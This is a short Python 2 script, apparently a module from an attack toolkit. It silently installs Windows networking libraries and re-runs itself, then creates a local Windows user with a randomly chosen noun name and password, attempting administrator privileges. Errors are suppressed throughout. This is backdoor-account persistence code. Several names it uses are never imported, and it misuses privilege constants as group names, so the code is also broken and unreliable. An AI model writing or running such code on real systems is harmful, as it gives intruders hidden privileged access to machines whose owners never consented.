#!/usr/bin/env python
# -*- encoding: utf-8 -*-
from os import getenv
from base64 import b64decode

try:
    from win32net import NetLocalGroupAddMembers, NetLocalGroupAdd, NetLocalGroupDel, NetUserAdd
    from win32netcon import UF_SCRIPT, USER_PRIV_ADMIN, USER_PRIV_USER, USER_PRIV_PARMNUM, USER_PRIV_INFOLEVEL, USER_PRIV_MASK, USER_PRIV_GUEST
except ImportError:
    try:
	import pip.commands.install as pip
	_ = pip.InstallCommand().main(['win32net', 'win32netcon'])
	execfile(sys.argv[0])
	sys.exit(0)
    except: pass

def main(*args, **kwargs):
    try:
	USER  = choice(get('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').text.encode().splitlines()).title()
	PASWD = choice(get('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').text.encode().splitlines()).title()
        for GROUP in [USER_PRIV_ADMIN, USER_PRIV_USER, USER_PRIV_PARMNUM, USER_PRIV_INFOLEVEL, USER_PRIV_MASK, USER_PRIV_GUEST]:
	    try:
		user_info = {
				'name': USER,
				'password': PASWD,
				'priv': GROUP,
				'home_dir': getenv('HOME'),
				'comment': None,
				'flags': UF_SCRIPT,
				'script_path': None
		}

		NetUserAdd(None, 1, user_info)
		group_info = dict({ 'name': GROUP })

		try:
		    NetLocalGroupDel(None, GROUP)
		except win32net.error,(number, context, message):
		    if number <> 2220:
			raise

	    	NetLocalGroupAdd(None, 0, group_info)
    		user_group_info = dict({ 'domainandname': USER })
    		NetLocalGroupAddMembers(None, GROUP, 3, [user_group_info])
		return user_info
	
	    except: pass
	return 'Module failed'
    except Exception as e:
	return "Error: {}".format(str(e))

if __name__ == '__main__':
    main()
		  
